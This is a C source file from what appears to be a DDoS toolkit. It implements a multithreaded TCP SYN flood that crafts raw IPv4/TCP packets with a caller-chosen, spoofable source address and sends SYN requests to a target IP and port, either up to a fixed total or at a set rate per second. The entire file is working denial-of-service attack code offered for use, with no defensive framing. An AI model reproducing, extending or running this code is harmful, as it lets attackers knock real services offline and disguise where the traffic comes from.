#include "../header.h"
#include "../base/make_ipv4.h"
#include "../base/make_tcp.h"
#include "../ddos/syn_flood.h"
#include "../base/subnet_mask.h"

unsigned int tcpsyn_total;
unsigned int tcpsyn_produced;

unsigned int tcpsyn_per_second;

char tcpsyn_dest_ip[16];
char tcpsyn_src_ip[16];

int tcpsyn_src_ip_mask;
int tcpsyn_dest_ip_mask;

char tcpsyn_now_src_ip[16];
char tcpsyn_now_dest_ip[16];

int tcpsyn_dest_port;

pthread_mutex_t tcpsyn_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t tcpsyn_cond = PTHREAD_COND_INITIALIZER;

struct timespec tcpsyn_time1, tcpsyn_time2;

void syn_flood_print_usage(int mode) {

	if (mode == 2)
		printf(
				"SYN flood Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
}

void* generate_syn_request1(void *data) {
	int thread_id = *((int*) data);
	int sock = make_socket(IPPROTO_TCP);
	while (1) {

		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(tcpsyn_src_ip));

		/*** If you want to modify ip address*/
		//next_ip_addr(tcpsyn_src_ip, 1);
		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(tcpsyn_dest_ip));

		struct tcphdr tcp_h;
		tcp_h = prepare_empty_tcp();
		//Lucky 7777 SRC PORT NUMBER;
		tcp_h = tcp_set_source(tcp_h, 7777);
		tcp_h = tcp_set_dest(tcp_h, tcpsyn_dest_port);
		tcp_h = tcp_set_seq(tcp_h, tcpsyn_produced);

		//tcp_h = tcp_set_ack_seq(tcp_h,35623);
		/***For SYN TCP request, ACK seq should not be provided.*/

		tcp_h = tcp_set_syn_flag(tcp_h);

		tcp_h = tcp_get_checksum(ipv4_h, tcp_h, NULL, 0);

		ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));
		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));

		printf("%d\n", ((struct iphdr*) packet)->tot_len);

		pthread_mutex_lock(&tcpsyn_mutex);

		if (tcpsyn_produced >= tcpsyn_total) {
			pthread_mutex_unlock(&tcpsyn_mutex);
			pthread_cond_broadcast(&tcpsyn_cond);
			return 0;
		}

		send_packet(sock, ipv4_h, packet, tcpsyn_dest_port);
		free(packet);
		tcpsyn_produced++;

		pthread_mutex_unlock(&tcpsyn_mutex);
	}
	close(sock);
	return 0;
}

void* generate_syn_request2(void *data) {
	int thread_id = *((int*) data);
	int sock = make_socket(IPPROTO_TCP);
	clock_t thread_clock;

	while (1) {
		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(tcpsyn_src_ip));

		//modify tcpsyn_src_ip, increment 1.
		//next_ip_addr(tcpsyn_src_ip, 1);

		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(tcpsyn_dest_ip));

		struct tcphdr tcp_h;
		tcp_h = prepare_empty_tcp();
		//Lucky 7777 SRC PORT NUMBER;
				tcp_h = tcp_set_source(tcp_h, 7777);
		tcp_h = tcp_set_dest(tcp_h, tcpsyn_dest_port);
		tcp_h = tcp_set_seq(tcp_h, tcpsyn_total);
		//tcp_h = tcp_set_ack_seq(tcp_h,35623);

		tcp_h = tcp_set_syn_flag(tcp_h);

		tcp_h = tcp_get_checksum(ipv4_h, tcp_h, NULL, 0);

		ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));
		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));

		pthread_mutex_lock(&tcpsyn_mutex);

		//Conditions begin.
		if (tcpsyn_produced >= tcpsyn_per_second) {
			pthread_cond_wait(&tcpsyn_cond, &tcpsyn_mutex);
		}

		//Get Time
		clock_gettime(CLOCK_MONOTONIC, &tcpsyn_time2);
		double tcpsyn_elapsed_time = (tcpsyn_time2.tv_sec - tcpsyn_time1.tv_sec)
				+ ((tcpsyn_time2.tv_nsec - tcpsyn_time1.tv_nsec) / 1000000000.0);

		//If time > 1.0
		if (tcpsyn_elapsed_time >= 1.0) {

			printf("-.\n");
			tcpsyn_produced = 0;

			clock_gettime(CLOCK_MONOTONIC, &tcpsyn_time1);
			pthread_cond_signal(&tcpsyn_cond);
		}

		send_packet(sock, ipv4_h, packet, tcpsyn_dest_port);
		free(packet);

		tcpsyn_produced++;
		printf("%d syn packet sent\n",tcpsyn_produced);

		tcpsyn_total++;

		pthread_mutex_unlock(&tcpsyn_mutex);
	}
	close(sock);
	return 0;
}

void* syn_time_check(void *data) {
	while (1) {

		pthread_mutex_lock(&tcpsyn_mutex);

		//Get Time
		clock_gettime(CLOCK_MONOTONIC, &tcpsyn_time2);
		double tcpsyn_elapsed_time = (tcpsyn_time2.tv_sec - tcpsyn_time1.tv_sec)
				+ ((tcpsyn_time2.tv_nsec - tcpsyn_time1.tv_nsec) / 1000000000.0);

		//If time > 1.0
		if (tcpsyn_elapsed_time >= 1.0) {
			printf("-.\n");
			tcpsyn_produced = 0;
			clock_gettime(CLOCK_MONOTONIC, &tcpsyn_time1);
			pthread_cond_signal(&tcpsyn_cond);
		}

		pthread_mutex_unlock(&tcpsyn_mutex);
	}
}

void syn_flood_run(char *argv[], int mode) {

	int argc = 0;
	tcpsyn_produced = 0;

	while (argv[argc] != NULL) {
		argc++;
	}

	if (mode == 2 && argc != 4) {
		syn_flood_print_usage(mode);
		return;
	}

	get_ip_from_ip_addr(argv[0], tcpsyn_src_ip);
	tcpsyn_src_ip_mask = get_mask_from_ip_addr(argv[0]);
	strcpy(tcpsyn_now_src_ip, tcpsyn_src_ip);

	get_ip_from_ip_addr(argv[1], tcpsyn_dest_ip);
	tcpsyn_dest_ip_mask = get_mask_from_ip_addr(argv[1]);
	strcpy(tcpsyn_now_dest_ip, tcpsyn_dest_ip);

	if (mode == 2) {
		tcpsyn_total = 0;
		tcpsyn_per_second = atoi(argv[3]);

		if (tcpsyn_per_second == 0)
			tcpsyn_per_second = __UINT_MAXIMUM__;

		tcpsyn_dest_port = atoi(argv[2]);
	}

	int num_threads = 10;

	int *generate_thread_id;
	pthread_t *generate_thread;

	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads + 1));
	generate_thread = (pthread_t*) malloc(
			sizeof(pthread_t) * (num_threads + 1));
	int i;

	printf("Sending SYN requests to %s using %d threads\n", tcpsyn_dest_ip,
			num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;

	clock_gettime(CLOCK_MONOTONIC, &tcpsyn_time1);

	for (i = 0; i < num_threads; i++) {
		if (mode == 1)
			pthread_create(&generate_thread[i], NULL, generate_syn_request1,
					(void*) &generate_thread_id[i]);
		if (mode == 2)
			pthread_create(&generate_thread[i], NULL, generate_syn_request2,
					(void*) &generate_thread_id[i]);
	}

	if (mode == 2) {
		pthread_create(&generate_thread[i], NULL, syn_time_check,
				(void*) &generate_thread_id[i]);
		num_threads++;
	}

	for (i = 0; i < num_threads+1; i++) {
		void *status;
		pthread_join(generate_thread[i], &status);
		printf("thread %d joined\n", i);
	}

	printf("SYN flood finished\nTotal %d packets sent.\n",
			tcpsyn_total);

	pthread_mutex_destroy(&tcpsyn_mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);
	return;
}

